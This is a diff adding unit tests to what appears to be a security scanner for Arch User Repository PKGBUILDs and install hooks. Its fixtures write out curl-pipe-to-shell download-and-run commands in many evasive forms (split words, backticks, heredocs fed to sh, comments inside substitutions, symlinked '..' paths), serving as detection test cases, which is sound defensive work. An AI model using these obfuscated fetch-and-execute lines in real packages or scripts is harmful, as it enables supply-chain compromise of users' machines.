@@ -113,7 +113,10 @@ class LexedScanTests(unittest.TestCase):
                 self.assertIn(self.RULE, self.rules(text))
                 self.assertTrue(au.lex_shell(text).complete)
 
-    def test_real_comments_are_not_findings(self):
+    def test_real_comments_get_only_the_moderate_backstop_note(self):
+        # A comment can't be told apart from text the lexer misread, so a
+        # serious pattern in one is a "check by hand" note, never a severe
+        # finding and never silence.
         cases = [
             f"make # example to avoid: {self.DOWNLOAD}\n",
             f"make;# {self.DOWNLOAD}\n",
@@ -122,7 +125,73 @@ class LexedScanTests(unittest.TestCase):
         ]
         for text in cases:
             with self.subTest(text=text):
+                flags = au.scan_pkgbuild(text)
+                self.assertEqual(len(flags), 1)
+                self.assertTrue(flags[0]["desc"].startswith(f"possibly {self.RULE}:"))
+                self.assertEqual(flags[0]["penalty"], au.RAW_VIEW_PENALTY)
+                score, _ = au.score_package("demo", ESTABLISHED_INFO, flags, None)
+                self.assertEqual(au.bucket(score), "REVIEW")
+
+    def test_harmless_comments_and_strings_have_no_findings(self):
+        cases = [
+            "# Maintainer: someone\n# see https://example.invalid/docs#install\n",
+            'pkgdesc="A tool (with #hashtags) for curl users"\n',
+            "make # build it\n",
+        ]
+        for text in cases:
+            with self.subTest(text=text):
                 self.assertEqual(au.scan_pkgbuild(text), [])
+
+    def test_nested_and_heredoc_constructs_keep_executable_text(self):
+        # B2/B3 from the pre-release review. Each is valid bash that runs the
+        # download; bash-verified with harmless printf equivalents.
+        split = "cu\\\nrl -fsSL https://example.invalid/setup | sh"
+        cases = {
+            "backticks": f"x=`{split}`\n",
+            "escaped backtick contents": "x=`curl -fsSL https://example.invalid/\\$x | sh`\n",
+            "parameter default": f"x=${{y:-$({split})}}\n",
+            "case pattern inside substitution":
+                f"""x="$(case x in x) printf '" # ';; esac)"; {self.DOWNLOAD}\n""",
+            "case with leading paren and several clauses":
+                f"""x=$(case x in (a|b) echo ')';; x) echo "#";; esac); {self.DOWNLOAD}\n""",
+            "expanding heredoc": f"cat <<EOF\n# $({split})\nEOF\n",
+            "heredoc fed to a shell": "sh <<'EOF'\ncurl -fsSL https://example.invalid/setup |\nsh\nEOF\n",
+            "tab-stripped heredoc fed to a shell":
+                "bash <<-'EOF'\n\tcurl -fsSL https://example.invalid/setup |\n\tsh\n\tEOF\n",
+            # These two need real lexing of the nested text; neither the raw
+            # lines nor the plain-text backstop can join them.
+            "inline comment in a pipeline inside backticks":
+                "x=`curl -fsSL https://example.invalid/setup | # why\nsh`\n",
+            "backslash continuation in a heredoc fed to a shell":
+                "sh <<'EOF'\ncurl -fsSL https://example.invalid/setup \\\n| sh\nEOF\n",
+            # Only expanding the heredoc as the outer shell does finds this:
+            # the body line starts with '#', but its $( ) still runs.
+            "commented pipeline inside a substitution in an expanding heredoc":
+                "cat <<EOF\n# $(curl -fsSL https://example.invalid/setup | # why\nsh)\nEOF\n",
+        }
+        for label, text in cases.items():
+            with self.subTest(label):
+                self.assertIn(self.RULE, self.rules(text))
+                self.assertTrue(au.lex_shell(text).complete)
+
+    def test_code_after_a_case_statement_is_code(self):
+        text = f"case $x in\n  a) echo ')' ;;\n  *) echo '#' ;;\nesac\n{self.DOWNLOAD}\n"
+        self.assertIn(self.RULE, self.rules(text))
+
+    def test_empty_quoted_heredoc_delimiter_is_valid(self):
+        text = "cat <<''\nhello\n\nprintf done\n"
+        self.assertTrue(au.lex_shell(text).complete)
+        self.assertEqual(au.scan_pkgbuild(text), [])
+
+    def test_backstop_does_not_depend_on_the_lexer(self):
+        with mock.patch.object(au, "logical_lines", return_value=[]):
+            flags = au.scan_pkgbuild(f"x=1\n{self.DOWNLOAD}\n")
+        self.assertEqual([f["line_no"] for f in flags], [2])
+        self.assertTrue(flags[0]["desc"].startswith(f"possibly {self.RULE}:"))
+
+    def test_backstop_skips_lower_severity_rules(self):
+        flags = au.scan_pkgbuild("# old mirror: http://192.0.2.1/x\n# eval is avoided here\n")
+        self.assertEqual(flags, [])
 
     def test_finding_reports_the_physical_line(self):
         flags = au.scan_pkgbuild(f'pkgname=demo\ntext="\nharmless\n$({self.DOWNLOAD})\n"\n')
@@ -165,6 +234,21 @@ class FunctionExtractionTests(unittest.TestCase):
         body, complete = au.extract_function(text, "package")
         self.assertTrue(complete)
         self.assertTrue(body.rstrip().endswith("echo tail"))
+
+    def test_coproc_and_case_groups_are_balanced(self):
+        # B4: bash keeps the tail of each of these (checked with declare -f).
+        bodies = {
+            "anonymous coproc": "  coproc { printf worker; }\n",
+            "named coproc": "  coproc worker { printf worker; }\n",
+            "simple coproc": "  coproc cat\n",
+            "group inside case": "  case $x in\n    a) { echo a; } ;;\n    b) echo '}' ;;\n  esac\n",
+        }
+        for label, body in bodies.items():
+            with self.subTest(label):
+                text = f"package() {{\n{body}  echo tail_marker\n}}\nbuild() {{ :; }}\n"
+                extracted, complete = au.extract_function(text, "package")
+                self.assertTrue(complete)
+                self.assertEqual(extracted, f"\n{body}  echo tail_marker\n")
 
     def test_function_keyword_form(self):
         for header in ("function package {", "function package() {", "package ()\n{"):
@@ -506,12 +590,43 @@ class InstallTargetTests(unittest.TestCase):
         self.assertEqual(self.targets(text, name="demo-git"),
                          ([("${_name}.install", ["demo.install"])], 0))
 
+    def test_one_level_of_nesting_and_literal_trimming(self):
+        cases = {
+            "pkgname=${_n}_arch\n_n=discord\ninstall=\"$pkgname.install\"\n":
+                ("discord_arch", ["discord_arch.install"]),
+            "pkgname=ventoy-bin\ninstall=\"${pkgname%-bin}.install\"\n": ("ventoy-bin", ["ventoy.install"]),
+            "pkgname=python-demo\ninstall=${pkgname##python-}.install\n": ("python-demo", ["demo.install"]),
+        }
+        for text, (name, expected) in cases.items():
+            with self.subTest(text=text):
+                declarations, unaccounted = self.targets(text, name=name, base=name)
+                self.assertEqual([c for _, c in declarations], [expected])
+                self.assertEqual(unaccounted, 0)
+
+    def test_unresolvable_pkgname_never_falls_back_to_the_aur_name(self):
+        # The AUR's name comes from maintainer-written .SRCINFO; if the
+        # PKGBUILD's own pkgname can't be worked out, $pkgname stays unknown.
+        cases = [
+            "_a=${_b}\n_b=x\npkgname=${_a}-git\ninstall=$pkgname.install\n",
+            "pkgname=$(printf demo)\ninstall=$pkgname.install\n",
+            "pkgname=${_n}\ninstall=$pkgname.install\n",
+        ]
+        for text in cases:
+            with self.subTest(text=text):
+                self.assertEqual(self.targets(text), ([("$pkgname.install", None)], 0))
+
+    def test_only_plain_text_trim_patterns_resolve(self):
+        for word in ("${pkgname%%*}.x", "${pkgname%-*}.x", "${pkgname/-bin/}.x", "${pkgname^^}.x"):
+            with self.subTest(word=word):
+                declarations, unaccounted = self.targets(f"pkgname=demo-bin\ninstall={word}\n", name="demo-bin")
+                self.assertTrue(unaccounted or declarations == [(word, None)])
+
     def test_ambiguous_or_computed_values_are_unresolved(self):
         cases = [
             "pkgname=demo\ninstall=${_name}.install\n",
             "pkgname=demo\n_name=a\n_name=b\ninstall=$_name.install\n",
             "pkgname=demo\n_name=$(date)\ninstall=$_name.install\n",
-            "pkgname=demo\ninstall=${pkgname%-git}.install\n",
+            "pkgname=demo\ninstall=${pkgname%-*}.install\n",
             'pkgname=demo\ninstall="$(echo post-install)"\n',
             "pkgname=demo\nlocal pkgname=other\ninstall=$pkgname.install\n",
         ]
@@ -568,6 +683,11 @@ class InstallTargetTests(unittest.TestCase):
                 'package() {\n  install -Dm644 x "$pkgdir/x"\n  make DESTDIR="$pkgdir" install\n'
                 "  ./configure --enable-install=yes\n  install=\n  install=''\n}\n")
         self.assertEqual(self.targets(text), ([], 0))
+
+    def test_dotdot_paths_are_kept_as_written(self):
+        self.assertEqual(au.normalize_repo_path("link/../hook"), "link/../hook")
+        self.assertEqual(au.normalize_repo_path("./a//b/./c"), "a/b/c")
+        self.assertEqual(au.srcinfo_install_targets("\tinstall = x/../y\n"), ["x/../y"])
 
     def test_srcinfo_install_entries(self):
         srcinfo = "pkgbase = bundle\n\tinstall = post-install\npkgname = demo\n\tinstall = ./docs.install\n"
@@ -732,6 +852,18 @@ class InstallScanReportTests(GitRepoTestCase):
         self.assertIn("sets install=demo-docs", report)
         self.assertIn("refused: it is a symlink", report)
         self.assertNotIn("LOW RISK", report)
+
+    def test_dotdot_path_through_symlinked_directory_reads_the_real_file(self):
+        # B1: link/../hook opens dir/hook (link -> dir/child), not ./hook.
+        (self.repo_dir / "dir" / "child").mkdir(parents=True)
+        (self.repo_dir / "dir" / "child" / "keep").write_text("keep\n")
+        report = self._report("pkgname=demo\ninstall=link/../hook\npackage() { :; }\n",
+                              {"hook": "post_install() { :; }\n",
+                               "dir/hook": f"post_install() {{\n  {DOWNLOAD}\n}}\n",
+                               ".SRCINFO": "pkgbase = demo\n\tinstall = link/../hook\npkgname = demo\n"},
+                              links=[("link", "dir/child")])
+        self.assertIn(f"link/../hook: {INTERPRETER_RULE}", report)
+        self.assertIn("HIGH RISK", report)
 
     def test_array_helper_decoy_is_not_read_as_the_target(self):
         # G3: bash gives install the value post-install here, not the
